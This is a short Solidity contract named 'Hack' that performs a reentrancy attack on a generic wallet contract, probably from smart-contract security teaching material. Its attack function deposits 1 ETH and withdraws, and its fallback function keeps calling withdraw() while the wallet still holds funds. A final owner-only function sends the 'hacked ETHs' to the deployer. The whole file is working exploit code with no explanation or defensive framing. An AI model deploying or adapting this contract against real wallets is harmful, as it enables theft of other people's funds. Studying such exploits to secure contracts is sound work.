// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface Wallet {
    function withdraw() external;
    function deposit() external payable;   
}

contract Hack {
    Wallet public wallet;

    address private owner;

    constructor(address _wallet) {
        wallet = Wallet(_wallet);
        owner = msg.sender;
    }

    fallback() external payable {
        if (address(wallet).balance >= 1 ether) {
            wallet.withdraw();
        }
    }
    
    function attack () external payable {
        uint val = msg.value;
        require(val == 1 ether, "deposit exactly 1 ETH!");
        wallet.deposit{value: 1 ether}();
        wallet.withdraw();
    }

    function getHackedETH() public {
        require(msg.sender == owner, "You are not the owner");
        (bool sent, ) = owner.call{value: address(this).balance}("");
        require(sent, "Failed to withdraw hacked ETHs F");
    }

}
